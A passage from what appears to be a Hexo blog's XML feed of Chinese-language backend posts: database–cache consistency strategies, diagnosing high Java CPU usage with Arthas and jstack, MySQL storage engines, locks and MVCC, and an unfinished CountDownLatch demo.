再删除缓存」的方案，是可以保证数据一致性的。</p><p>所以，我们应该采用这种方案，来操作数据库和缓存。</p><h3 id="如何保证两步都执行成功"><a href="#如何保证两步都执行成功" class="headerlink" title="如何保证两步都执行成功"></a>如何保证两步都执行成功</h3><p>前面我们分析到，无论是更新缓存还是删除缓存，只要第二步发生失败，那么就会导致数据库和缓存不一致。</p><p><strong>保证第二步成功执行，就是解决问题的关键。</strong></p><p>想一下，程序在执行过程中发生异常，最简单的解决办法是什么？</p><p>答案是：<strong>重试</strong>。</p><p>是的，其实这里我们也可以这样做。</p><p>无论是先操作缓存，还是先操作数据库，但凡后者执行失败了，我们就可以发起重试，尽可能地去做「补偿」。</p><p>那这是不是意味着，只要执行失败，我们「无脑重试」就可以了呢？</p><p>答案是否定的。现实情况往往没有想的这么简单，失败后立即重试的问题在于：</p><ul><li>立即重试很大概率「还会失败」</li><li>「重试次数」设置多少才合理？</li><li>重试会一直「占用」这个线程资源，无法服务其它客户端请求</li></ul><p>看到了么，虽然我们想通过重试的方式解决问题，但这种「同步」重试的方案依旧不严谨。</p><p>那更好的方案应该怎么做？</p><p>答案是：<strong>异步重试</strong>。什么是异步重试？</p><p>其实就是把重试请求写到「消息队列」中，然后由专门的消费者来重试，直到成功。</p><p>或者更直接的做法，为了避免第二步执行失败，我们可以把操作缓存这一步，直接放到消息队列中，由消费者来操作缓存。</p><p>到这里你可能会问，写消息队列也有可能会失败啊？而且，引入消息队列，这又增加了更多的维护成本，这样做值得吗？</p><p>这个问题很好，但我们思考这样一个问题：如果在执行失败的线程中一直重试，还没等执行成功，此时如果项目「重启」了，那这次重试请求也就「丢失」了，那这条数据就一直不一致了。</p><p>所以，这里我们必须把重试或第二步操作放到另一个「服务」中，这个服务用「消息队列」最为合适。这是因为消息队列的特性，正好符合我们的需求：</p><ul><li><strong>消息队列保证可靠性</strong>：写到队列中的消息，成功消费之前不会丢失（重启项目也不担心）</li><li><strong>消息队列保证消息成功投递</strong>：下游从队列拉取消息，成功消费后才会删除消息，否则还会继续投递消息给消费者（符合我们重试的场景）</li></ul><p>至于写队列失败和消息队列的维护成本问题：</p><ul><li><strong>写队列失败</strong>：操作缓存和写消息队列，「同时失败」的概率其实是很小的</li><li><strong>维护成本</strong>：我们项目中一般都会用到消息队列，维护成本并没有新增很多</li></ul><p>所以，引入消息队列来解决这个问题，是比较合适的。这时架构模型就变成了这样：</p><p><img src="/img/cache/cache4.png" alt=""></p><p>那如果你确实不想在应用中去写消息队列，是否有更简单的方案，同时又可以保证一致性呢？</p><p>方案还是有的，这就是近几年比较流行的解决方案：<strong>订阅数据库变更日志，再操作缓存</strong>。</p><p>具体来讲就是，我们的业务应用在修改数据时，「只需」修改数据库，无需操作缓存。</p><p>那什么时候操作缓存呢？这就和数据库的「变更日志」有关了。</p><p>拿 MySQL 举例，当一条数据发生修改时，MySQL 就会产生一条变更日志（Binlog），我们可以订阅这个日志，拿到具体操作的数据，然后再根据这条数据，去删除对应的缓存。</p><p><img src="/img/cache/cache5.png" alt=""></p><p>订阅变更日志，目前也有了比较成熟的开源中间件，例如阿里的 canal，使用这种方案的优点在于：</p><ul><li><strong>无需考虑写消息队列失败情况</strong>：只要写 MySQL 成功，Binlog 肯定会有</li><li><strong>自动投递到下游队列</strong>：canal 自动把数据库变更日志「投递」给下游的消息队列</li></ul><p>当然，与此同时，我们需要投入精力去维护 canal 的高可用和稳定性。</p><blockquote><p>如果你有留意观察很多数据库的特性，就会发现其实很多数据库都逐渐开始提供「订阅变更日志」的功能了，相信不远的将来，我们就不用通过中间件来拉取日志，自己写程序就可以订阅变更日志了，这样可以进一步简化流程。</p></blockquote><p>至此，我们可以得出结论，想要保证数据库和缓存一致性，<strong>推荐采用「先更新数据库，再删除缓存」方案，并配合「消息队列」或「订阅变更日志」的方式来做</strong>。</p><h3 id="数据库和缓存可以做到强一致吗"><a href="#数据库和缓存可以做到强一致吗" class="headerlink" title="数据库和缓存可以做到强一致吗"></a>数据库和缓存可以做到强一致吗</h3><p>要想做到强一致，最常见的方案是 2PC、3PC、Paxos、Raft 这类一致性协议，但它们的性能往往比较差，而且这些方案也比较复杂，还要考虑各种容错问题。</p><p>相反，这时我们换个角度思考一下，我们引入缓存的目的是什么？</p><p>没错，<strong>性能</strong>。</p><p>一旦我们决定使用缓存，那必然要面临一致性问题。性能和一致性就像天平的两端，无法做到都满足要求。</p><p>而且，就拿我们前面讲到的方案来说，当操作数据库和缓存完成之前，只要有其它请求可以进来，都有可能查到「中间状态」的数据。</p><p>所以如果非要追求强一致，那必须要求所有更新操作完成之前期间，不能有「任何请求」进来。</p><p>虽然我们可以通过加「分布锁」的方式来实现，但我们要付出的代价，很可能会超过引入缓存带来的性能提升。</p><p>所以，既然决定使用缓存，就必须容忍「一致性」问题，我们只能尽可能地去降低问题出现的概率。</p><p>同时我们也要知道，缓存都是有「失效时间」的，就算在这期间存在短期不一致，我们依旧有失效时间来兜底，这样也能达到最终一致。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.pdai.tech/md/arch/arch-y-cache.html" target="_blank" rel="noopener">https://www.pdai.tech/md/arch/arch-y-cache.html</a></li><li><a href="https://mp.weixin.qq.com/s/D4Ik6lTA_ySBOyD3waNj1w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/D4Ik6lTA_ySBOyD3waNj1w</a></li><li><a href="https://www.moguit.cn/cInfo/2936?title=%E9%9D%A2%E7%BB%8F" target="_blank" rel="noopener">https://www.moguit.cn/cInfo/2936?title=%E9%9D%A2%E7%BB%8F</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排查线上java程序高CPU占比代码</title>
      <link href="/2022/07/14/%E6%8E%92%E6%9F%A5%E7%BA%BF%E4%B8%8Ajava%E7%A8%8B%E5%BA%8F%E9%AB%98CPU%E5%8D%A0%E6%AF%94%E4%BB%A3%E7%A0%81/"/>
      <url>/2022/07/14/%E6%8E%92%E6%9F%A5%E7%BA%BF%E4%B8%8Ajava%E7%A8%8B%E5%BA%8F%E9%AB%98CPU%E5%8D%A0%E6%AF%94%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="java程序CPU占比过高分析"><a href="#java程序CPU占比过高分析" class="headerlink" title="java程序CPU占比过高分析"></a>java程序CPU占比过高分析</h2><h2 id="一、Arthas分析高CPU占比代码"><a href="#一、Arthas分析高CPU占比代码" class="headerlink" title="一、Arthas分析高CPU占比代码"></a>一、Arthas分析高CPU占比代码</h2><p>Arthas官方文档地址:<a href="https://arthas.aliyun.com/doc/quick-start.html" target="_blank" rel="noopener">https://arthas.aliyun.com/doc/quick-start.html</a></p><h3 id="1-1-启动Arthas"><a href="#1-1-启动Arthas" class="headerlink" title="1.1 启动Arthas"></a>1.1 启动Arthas</h3><p>在命令行下面执行（使用和目标进程一致的用户启动，否则可能attach失败）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O https:&#x2F;&#x2F;arthas.aliyun.com&#x2F;arthas-boot.jar</span><br><span class="line">java -jar arthas-boot.jar</span><br></pre></td></tr></table></figure><p>执行该程序的用户需要和目标进程具有相同的权限。比如以admin用户来执行：<code>sudo su admin &amp;&amp; java -jar arthas-boot.jar</code> 或 <code>sudo -u admin -EH java -jar arthas-boot.jar</code>。<br>如果attach不上目标进程，可以查看~/logs/arthas/ 目录下的日志。<br>如果下载速度比较慢，可以使用aliyun的镜像：<code>java -jar arthas-boot.jar --repo-mirror aliyun --use-httpjava -jar arthas-boot.jar -h</code> 打印更多参数信息。</p><h3 id="1-2-模拟CPU飙升代码"><a href="#1-2-模拟CPU飙升代码" class="headerlink" title="1.2 模拟CPU飙升代码"></a>1.2 模拟CPU飙升代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fun cpuHigh() &#123;</span><br><span class="line">    Thread &#123;</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            println(&quot;cpu飙升中～&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;.start()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-运行项目运行Arthas-找到自己当前项目对应的PID进行监听"><a href="#1-3-运行项目运行Arthas-找到自己当前项目对应的PID进行监听" class="headerlink" title="1.3 运行项目运行Arthas,找到自己当前项目对应的PID进行监听"></a>1.3 运行项目运行Arthas,找到自己当前项目对应的PID进行监听</h3><p><img src="/img/cpu/cpu0.png" alt=""></p><h3 id="1-3-输入dashboard仪表盘显示当前进程相关信息"><a href="#1-3-输入dashboard仪表盘显示当前进程相关信息" class="headerlink" title="1.3 输入dashboard仪表盘显示当前进程相关信息"></a>1.3 输入dashboard仪表盘显示当前进程相关信息</h3><p><img src="/img/cpu/cpu1.png" alt=""></p><h3 id="1-4-使用-thread-命令，排查当前项目中的各个运行中方法的CPU占用率情况"><a href="#1-4-使用-thread-命令，排查当前项目中的各个运行中方法的CPU占用率情况" class="headerlink" title="1.4 使用 thread 命令，排查当前项目中的各个运行中方法的CPU占用率情况"></a>1.4 使用 <code>thread</code> 命令，排查当前项目中的各个运行中方法的CPU占用率情况</h3><p>可见图中，<code>ID=11</code>的线程CPU占用率很高，达到66.09%</p><p><img src="/img/cpu/cpu2.png" alt=""></p><h3 id="1-5-使用-thread-id-命令，继续查看这个线程具体是哪个方法所导致的CPU占用率过高"><a href="#1-5-使用-thread-id-命令，继续查看这个线程具体是哪个方法所导致的CPU占用率过高" class="headerlink" title="1.5 使用 thread -[id] 命令，继续查看这个线程具体是哪个方法所导致的CPU占用率过高"></a>1.5 使用 <code>thread -[id]</code> 命令，继续查看这个线程具体是哪个方法所导致的CPU占用率过高</h3><p><img src="/img/cpu/cpu3.png" alt=""></p><p>由图可见，<code>id=11</code>的任务处于<strong>RUNNABLE状态</strong>，且CPU占用率高的主要原因是因为一直进行FileOutputStream操作，也就是输出流操作，并且定位代码在 <code>TestMain.kt</code> 中的第28行执行了这个高CPU占用率的方法，而导致的，再来看下代码</p><p><img src="/img/cpu/cpu4.png" alt=""></p><h2 id="二、jstack获取线程快照分析CPU占比代码"><a href="#二、jstack获取线程快照分析CPU占比代码" class="headerlink" title="二、jstack获取线程快照分析CPU占比代码"></a>二、jstack获取线程快照分析CPU占比代码</h2><ol><li>查找高占比进程pid,使用<code>ps -ef|grep java</code> 、 <code>jps</code>查找对应java进程pid</li></ol><p>或使用top<code>`top -p &lt;pid&gt;</code> 查看Java进程的cpu占用：</p><p><img src="/img/cpu/CPU占比分析0.png" alt=""></p><p>该Java进程占用cpu达到92.2%。</p><ol><li>使用 top -Hp <pid> 命令（<pid>为Java进程的id号）查看该Java进程内所有线程的资源占用情况（按shft+p按照cpu占用进行排序，按shift+m按照内存占用进行排序）此处按照cpu排序</li></ol><p><img src="/img/cpu/CPU占比分析1.png" alt=""></p><p>可以看到，有两个线程号为97243，97912的线程占用cpu分别达到了69.2%和22.0%</p><ol><li>使用 printf “%x “ <tid> 命令（tid指线程的id号）将以上10进制的线程号转换为16进制：</li></ol><p><img src="/img/cpu/CPU占比分析2.png" alt=""></p><p>转换后的结果分别为17bdb，17e78，由于16进制以0x开头，所以对应的16进制的线程号为0x17bdb和0x17e78。</p><ol><li><p>使用jdk自带命令jstack获取此时的线程快照并输入到文件中： jstack -l <pid> &gt; ./jstack_result.txt 命令（<pid>为Java进程的id号）来获取线程快照结果并输入到指定文件。</p></li><li><p>查看第4步生成的txt文件，在其中搜索tid为0x17bdb的线程：</p></li></ol><p><img src="/img/cpu/CPU占比分析3.png" alt=""></p><p>可以看到线程号为0x17bdb（10进制线程号97243）对应的是一个”VM Thread”即虚拟机线程，这个不是与我们代码相关的线程，所以暂时忽略。</p><p>　　再看0x17e78线程：</p><p><img src="/img/cpu/CPU占比分析4.png" alt=""></p><p>该线程的堆栈较深，且很明显有调用我们自己代码的逻辑，并且提示了具体的代码行数，我们查看该处代码：</p><p><img src="/img/cpu/CPU占比分析5.png" alt=""></p><p>发现此处是在一个死循环里边重复的拼接字符串导致的，我们知道，String类使用contact方法拼接字符串其实是创建新的对象并返回，看到这里，似乎可以和占用cpu最高的”VM Thread”联系起来了，因此作出假设：由于代码一直循环创建对象，导致不断有不再被引用的对象产生，虚拟机检测到对象不再被引用之后，就进行垃圾回收，垃圾回收占用了很大一部分cpu资源。</p><p>　　为了证明该假设，设置jvisualvm监控，经过一段时间允许，cpu资源监控结果如下：</p><p><img src="/img/cpu/CPU占比分析6.png" alt=""></p><p>可以看到cpu总占用达到88.5%，而垃圾回收活动占用cpu达到84.0%，因此证明了上述假设。</p><p>　　知道了该问题的原因后，我们还想知道此时垃圾回收的频率，耗时等信息，于是可以设置JVM参数 -XX:+PrintGCDetails -XX:+PrintGCDateStamps -Xloggc:./gc.log （或者使用jinfo命令动态设置GC日志，可以看到日志内容：</p><p>　　 <img src="/img/cpu/CPU占比分析7.png" alt=""></p><p>gc.log中频繁的打印垃圾回收，不过我们看到的基本都是Minor GC，即新生代的垃圾回收。</p><p>　　为了更清晰的查看各个区的垃圾回收情况，可以使用jstat命令 jstat -gc <pid> <period> <count> （pid为Java进程的id，period指每次监控之间的时间间隔，count指监控次数）来监控垃圾回收，打印内容如下：</p><p>　　 <img src="/img/cpu/CPU占比分析8.png" alt=""></p><p>可以看到，虚拟机在进行频繁的Full GC，每次耗时均在增长。</p><p>　　总结：</p><p>　　分析Java进程占用cpu过高问题时候，基本都可以按照如下步骤进行分析：</p><p>　　（1）使用 top -Hp <pid> 命令找出进程中占用cpu最高的前几个线程</p><p>　　（2）使用jstack获取线程快照，然后使用线程id搜索分析快照文件</p><p>　　（3）如果线程调用了业务相关代码，则分析是否是代码问题导致的cpu占用过高，如果线程是VM Thread，则应该监控检查垃圾回收活动频率，看是否是因为频繁进行垃圾回收导致的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 线上问题分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL高级</title>
      <link href="/2022/06/23/MySQL%E9%AB%98%E7%BA%A7/"/>
      <url>/2022/06/23/MySQL%E9%AB%98%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL高级"><a href="#MySQL高级" class="headerlink" title="MySQL高级"></a>MySQL高级</h2><h3 id="一、MySQL简介"><a href="#一、MySQL简介" class="headerlink" title="一、MySQL简介"></a>一、MySQL简介</h3><p>MySQL 是⼀种关系型数据库，在Java企业级开发中⾮常常⽤，因为 MySQL 是开源免费的，并 且⽅便扩展。阿⾥巴巴数据库系统也⼤量⽤到了 MySQL，因此它的稳定性是有保障的。MySQL 是开放源代码的，因此任何⼈都可以在 GPL(General Public License) 的许可下下载并根据个性化的需要对其进⾏修改。MySQL的默认端⼝号是3306。</p><h3 id="二、MySQL存储引擎"><a href="#二、MySQL存储引擎" class="headerlink" title="二、MySQL存储引擎"></a>二、MySQL存储引擎</h3><p>MyISAM是MySQL的默认数据库引擎（5.5版之前）。虽然性能极佳，⽽且提供了⼤量的特性， 包括全⽂索引、压缩、空间函数等，但MyISAM不⽀持事务和⾏级锁，⽽且最⼤的缺陷就是崩溃 后⽆法安全恢复。不过，5.5版本之后，MySQL引⼊了InnoDB（事务性数据库引擎），MySQL 5.5版本后默认的存储引擎为InnoDB。</p><h4 id="MyISAM和InnoDB区别"><a href="#MyISAM和InnoDB区别" class="headerlink" title="MyISAM和InnoDB区别"></a>MyISAM和InnoDB区别</h4><ol><li>是否⽀持⾏级锁 : MyISAM 只有表级锁(table-level locking)，⽽InnoDB ⽀持⾏级锁(rowlevel locking)和表级锁,默认为⾏级锁。</li><li>是否⽀持事务和崩溃后的安全恢复： MyISAM 强调的是性能，每次查询具有原⼦性,其执⾏ 速度⽐InnoDB类型更快，但是不提供事务⽀持。但是InnoDB 提供事务⽀持事务，外部键等 ⾼级数据库功能。 具有事务(commit)、回滚(rollback)和崩溃修复能⼒(crash recovery capabilities)的事务安全(transaction-safe (ACID compliant))型表。 </li><li>是否⽀持外键： MyISAM不⽀持，⽽InnoDB⽀持。</li><li>是否⽀持MVCC ：仅 InnoDB ⽀持。应对⾼并发事务, MVCC⽐单纯的加锁更⾼效;MVCC只 在 READ COMMITTED 和 REPEATABLE READ 两个隔离级别下⼯作;</li></ol><h3 id="三、MySQL-explain执行计划"><a href="#三、MySQL-explain执行计划" class="headerlink" title="三、MySQL explain执行计划"></a>三、MySQL explain执行计划</h3><p>使用 EXPLAIN 关键字可以模拟优化器执行 SQL 查询语句，从而知道 MYSQL 是如何处理你的 sql 语句的。分析你的查询语句或是表结构的性能瓶颈。</p><p>语法: Explain + sql</p><h3 id="执行计划的作用"><a href="#执行计划的作用" class="headerlink" title="执行计划的作用"></a>执行计划的作用</h3><p>分析sql语句中</p><ul><li>表的读取顺序</li><li>数据读取操作的操作类型</li><li>哪些索引可以使用</li><li>哪些索引被实际使用</li><li>表之间的引用</li><li>每张表有多少行被优化器查</li></ul><h3 id="执行计划包含的信息"><a href="#执行计划包含的信息" class="headerlink" title="执行计划包含的信息"></a>执行计划包含的信息</h3><p><strong>id:获取 select 子句的操作表顺序，有几种情况</strong></p><p><strong>select_type:查询的类别，主要用于区别普通查询，联合查询，子查询等的复杂查询。</strong></p><p><strong>table：显示这一行的数据是关于那个表的</strong></p><p><strong>type:显示的是访问类型，是较为重要的一个指标，结果值从最好到最坏依次是：</strong></p><p><strong>possible_keys</strong> : 可能使用的索引</p><p><strong>key :实际上使用的索引，如果没用索引，则为NULL，查询中若使用了覆盖索引，则该索引和查询的select 字段重叠。</strong></p><p><strong>key len ：</strong><br>表示索引中使用的字节数，可通过该列计算查询中使用的字节长度，在不损失精确的情况下，长度越短越好。</p><p><strong>rows</strong> : mysql 预估为了找到所需的行而要读取的行数</p><h3 id="四、MySQL索引"><a href="#四、MySQL索引" class="headerlink" title="四、MySQL索引"></a>四、MySQL索引</h3><h4 id="索引的分类"><a href="#索引的分类" class="headerlink" title="索引的分类"></a>索引的分类</h4><p>（1）主键索引，即主索引，根据主键建立索引，不允许重复，空值<br>ALTER TABLE ‘mydb’ ADD PRIMARY KEY pk_index(‘a’)；</p><p>（2）唯一索引，用来建立索引的值必须是唯一的，允许空值。<br>ALTER TABLE ‘mydb’ ADD UNIQUE index_name(‘a’)；</p><p>（3）普通索引：用表中的普通列构建的索引，没有任何限制<br>ALTER TABLE ‘mydb’ ADD INDEX index_name(‘a’)；</p><p>（4）组合索引：用多个列组合构建的索引，这多个列中的值不允许有空值<br>ALTER TABLE ‘mydb’ ADD INDEX index_name(‘a’，‘a2’，‘a3’…)；</p><h3 id="五、MySQL锁"><a href="#五、MySQL锁" class="headerlink" title="五、MySQL锁"></a>五、MySQL锁</h3><h4 id="锁分类"><a href="#锁分类" class="headerlink" title="锁分类"></a>锁分类</h4><p>从对数据操作的粒度分 ：</p><p> 1） 表锁：操作时，会锁定整个表。 </p><p>2） 行锁：操作时，会锁定当前操作行。</p><p> 从对数据操作的类型分： </p><p>1） 读锁（共享锁）：针对同一份数据，多个读操作可以同时进行而不会互相影响。 </p><p>2） 写锁（排它锁）：当前操作没有完成之前，它会阻断其他写锁和读锁。</p><h4 id="InnoDB-的行锁模式"><a href="#InnoDB-的行锁模式" class="headerlink" title="InnoDB 的行锁模式"></a>InnoDB 的行锁模式</h4><p>InnoDB 实现了以下两种类型的行锁。</p><p> 共享锁（S）：又称为读锁，简称S锁，共享锁就是多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。</p><p> 排他锁（X）：又称为写锁，简称X锁，排他锁就是不能与其他锁并存，如一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁，但是获取排他锁的事务是可以对数据就行读取和修改。</p><h4 id="间隙锁"><a href="#间隙锁" class="headerlink" title="间隙锁"></a>间隙锁</h4><p>当我们用范围条件，而不是使用相等条件检索数据，并请求共享或排他锁时，InnoDB会给符合条件的已有数据进行加锁； 对于键值在条件范围内但并不存在的记录，叫做 “间隙（GAP）” ， InnoDB也会对这个 “间隙” 加锁，这种锁机制就是所谓的 间隙锁（Next-Key锁） 。</p><h3 id="六、MVCC"><a href="#六、MVCC" class="headerlink" title="六、MVCC"></a>六、MVCC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>MVCC（Multi-Version Concurrency Control）即多版本并发控制。MVCC 是一种并发控制的方法，一般在数据库管理系统中，实现对数据库的并发访问。MVCC使得大部分支持行锁的事务引擎，不再单纯的使用行锁来进行数据库的并发控制，取而代之的是把数据库的行锁与行的多个版本结合起来，只需要很小的开销，就可以实现非锁定读，从而大大提高数据库系统的并发性能。</p><p>如果有人从数据库中读数据的同时，有另外的人写入数据，有可能读数据的人会看到『半写』或者不一致的数据。有很多种方法来解决这个问题，叫做并发控制方法。最简单的方法，通过加锁，让所有的读者等待写者工作完成，但是这样效率会很差。MVCC 使用了一种不同的手段，每个连接到数据库的读者，在某个瞬间看到的是数据库的一个快照，写者写操作造成的变化在写操作完成之前（或者数据库事务提交之前）对于其他的读者来说是不可见的。</p><h3 id="MySQL实现"><a href="#MySQL实现" class="headerlink" title="MySQL实现"></a>MySQL实现</h3><p>.InnoDB存储引擎在数据库每行数据的后面添加了三个字段</p><ul><li>6字节的<code>事务ID</code>(<code>DB_TRX_ID</code>)字段: 用来标识最近一次对本行记录做修改(insert|update)的事务的标识符, 即最后一次修改(insert|update)本行记录的事务id。<br>至于delete操作，在innodb看来也不过是一次update操作，更新行中的一个特殊位将行表示为deleted, <strong>并非真正删除</strong>。</li><li>7字节的<code>回滚指针</code>(<code>DB_ROLL_PTR</code>)字段: 指写入回滚段(rollback segment)的 <code>undo log</code> record (撤销日志记录记录)。<br>如果一行记录被更新, 则 <code>undo log</code> record 包含 ‘重建该行记录被更新之前内容’ 所必须的信息。</li><li>6字节的<code>DB_ROW_ID</code>字段: 包含一个随着新行插入而单调递增的行ID, 当由innodb自动产生聚集索引时，聚集索引会包括这个行ID的值，否则这个行ID不会出现在任何索引中。<br>结合聚簇索引的相关知识点, 我的理解是, 如果我们的表中没有主键或合适的唯一索引, 也就是无法生成聚簇索引的时候, InnoDB会帮我们自动生成聚集索引, 但聚簇索引会使用DB_ROW_ID的值来作为主键; 如果我们有自己的主键或者合适的唯一索引, 那么聚簇索引中也就不会包含 DB_ROW_ID 了 。</li></ul><h3 id="快照读和当前读"><a href="#快照读和当前读" class="headerlink" title="快照读和当前读"></a>快照读和当前读</h3><p>1.MySQL的InnoDB存储引擎默认事务隔离级别是RR(可重复读), 是通过 “行排他锁+MVCC” 一起实现的, 不仅可以保证可重复读, 还可以<strong>部分</strong>防止幻读, 而非完全防止;</p><p>2.为什么是部分防止幻读, 而不是完全防止?</p><ul><li>效果: 在如果事务B在事务A执行中, insert了一条数据并提交, 事务A再次查询, 虽然读取的是undo中的旧版本数据(防止了部分幻读), 但是事务A中执行update或者delete都是可以成功的!!</li><li>因为在innodb中的操作可以分为<code>当前读(current read)</code>和<code>快照读(snapshot read)</code>:</li></ul><p>3.快照读(snapshot read)</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简单的<span class="keyword">select</span>操作(当然不包括 <span class="keyword">select</span> <span class="params">...</span> lock <span class="keyword">in</span> share mode, <span class="keyword">select</span> <span class="params">...</span> for update)</span><br></pre></td></tr></table></figure><p>4.当前读(current read) <a href="https://link.segmentfault.com/?enc=qN7er09DQWbuI1dC9qilng%3D%3D.BmE47RWlckuvRv94RtE4mIVatH7ffG5vwH5zOEyyL3TqZnBTG2LVOvwECW3BBmxMkkFwoQaigBUzsZpGRDozIDZ0lRz5FPGlDP7waZndEnQ%3D" target="_blank" rel="noopener">官网文档 Locking Reads</a></p><ul><li>select … lock in share mode</li><li>select … for update</li><li>insert</li><li>update</li><li>delete</li></ul><p>在RR级别下，快照读是通过MVVC(多版本控制)和undo log来实现的，当前读是通过加record lock(记录锁)和gap lock(间隙锁)来实现的。<br>innodb在快照读的情况下并没有真正的避免幻读, 但是在当前读的情况下避免了不可重复读和幻读!!</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>所谓的MVCC（Multi-Version Concurrency Control 多版本并发控制）指的就是在使用读已提交（READ COMMITTD）、可重复读（REPEATABLE READ）这两种隔离级别的事务在执行普通的SELECT操作时访问记录的版本链的过程，这样子可以使不同事务的读-写、写-读操作并发执行，从而提升系统性能。</p><p>这两个隔离级别的一个很大不同就是：生成ReadView的时机不同，READ COMMITTD在每一次进行普通SELECT操作前都会生成一个ReadView，而REPEATABLE READ只在第一次进行普通SELECT操作前生成一个ReadView，数据的可重复读其实就是ReadView的重复使用。</p><p>InnoDB通过为每一行记录添加两个额外的隐藏的值来实现MVCC，这两个值一个记录这行 数据何时被创建，另外一个记录这行数据何时过期（或者被删除）。但是InnoDB并不存储这些事件发生时的实际时间，相反它只存储这些事件发生时的系统版本号。这是一个随着事务的创建而不断增长的数字。每个事务在事务开始时会记录它自己的系统版本号。每个查询必须去检查每行数据的版本号与事务的版本号是否相同。</p><p>这种额外的记录所带来的结果就是对于大多数查询来说根本就不需要获得一个锁。<br> 他们只是简单地以最快的速度来读取数据，确保只选择符合条件的行。这个方案的缺点在于存储引擎必须为每一行存储更多的数据，做更多的检查工作，处理更多的善后操作。<br> 使用MVCC多版本并发控制比锁定模型的主要优点是在MVCC里， 对检索（读）数据的锁要求与写数据的锁要求不冲突， 所以读不会阻塞写，而写也从不阻塞读。<br> 在数据库里也有表和行级别的锁定机制， 用于给那些无法轻松接受 MVCC 行为的应用。 不过，恰当地使用 MVCC 总会提供比锁更好地性能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>countDownLatch简介与基础使用</title>
      <link href="/2022/05/15/countDownLatch/"/>
      <url>/2022/05/15/countDownLatch/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong><code>CountDownLatch</code>允许一个或者多个线程去等待其他线程完成操作。</strong></p><p><code>CountDownLatch</code>接收一个<code>int</code>型参数，表示要等待的工作线程的个数。</p><p>当然也不一定是多线程，在单线程中可以用这个<code>int</code>型参数表示多个操作步骤。</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>CountDownLatch 提供了一些方法：</p><p>方法    说明<br>await()    使当前线程进入同步队列进行等待，直到latch的值被减到0或者当前线程被中断，当前线程就会被唤醒。<br>await(long timeout, TimeUnit unit)    带超时时间的await()。<br>countDown()    使latch的值减1，如果减到了0，则会唤醒所有等待在这个latch上的线程。<br>getCount()    获得latch的数值。</p><div class="table-container"><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>await()</td><td>使当前线程进入同步队列进行等待，直到latch的值被减到0或者当前线程被中断，当前线程就会被唤醒。</td></tr><tr><td>await(long timeout, TimeUnit unit)</td><td>带超时时间的await()。</td></tr><tr><td>countDown()</td><td>使latch的值减1，如果减到了0，则会唤醒所有等待在这个latch上的线程。</td></tr><tr><td>getCount()</td><td>获得latch的数值。</td></tr></tbody></table></div><h2 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h2><p>线程池配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoThreadPoolConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AtomicInteger ATOMIC_INTEGER = <span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AtomicInteger PLZDLX_ATOMIC_INTEGER = <span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CORE_POOL_SIZE = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PLZDLX_CORE_POOL_SIZE = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAXIMUM_POOL_SIZE = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span 